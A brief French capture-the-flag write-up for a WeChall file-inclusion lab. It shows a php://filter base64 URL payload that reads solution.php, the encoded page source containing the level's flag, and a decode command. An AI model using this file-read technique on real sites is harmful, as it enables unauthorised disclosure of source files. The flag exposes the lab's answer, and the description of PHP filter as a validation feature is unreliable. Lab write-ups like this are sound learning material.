# Solution du niveau 15

### Afin de trouver le flag du niveau 15, voici comment j'ai procédé:

- On commence par se rendre sur le site de <b style = 'color: #aaff22' >wechall.net</b> et on accede au challenge ***live rfi***. On y trouve un lien qui nous redirige vers la page du niveau 14.

- Comme avec les niveaux précédent, le flag doit se trouver dans un fichier `solution`.  Il faut donc parcourir ce site pour trouver ce fichier. Pour se faire on peut utiliser <i style='color: #f4a21f'>PHP filter</i>. C'est une fonctionnalité qui permet de s'assurer que les données entrantes correspondent à des critères spécifiques.

- En plus de cette fonctionnalité, on utilisera aussi <i style='color: #f4a21f'>l'encodage en base64</i>  pour contourner les filtres ou les contrôles de sécurité mis en place par le site.

- En appliquant tous ces éléments avec l'url du site, on aura quelque chose comme ceci:
>https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php

- On sera rediriger vers une page avec le long texte suivant :
> PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K

- Afin de comprendre ce que ce texte veut dire, il faut le convertir <i style='color: #f4a21f'>en encodage UTF-8</i>. Il existe plusieurs façon de s'y prendre:

    - soit à l'aide d'un site spécialisé dans ce domaine,

    - soit en utilisant la commande linux suivante: <pre>echo "<b style = 'color:cyan'>le texte en base 64 ici</b>" | base64 -d -i </pre>

- Une fois converti, on y trouvera le flag du niveau 15.

---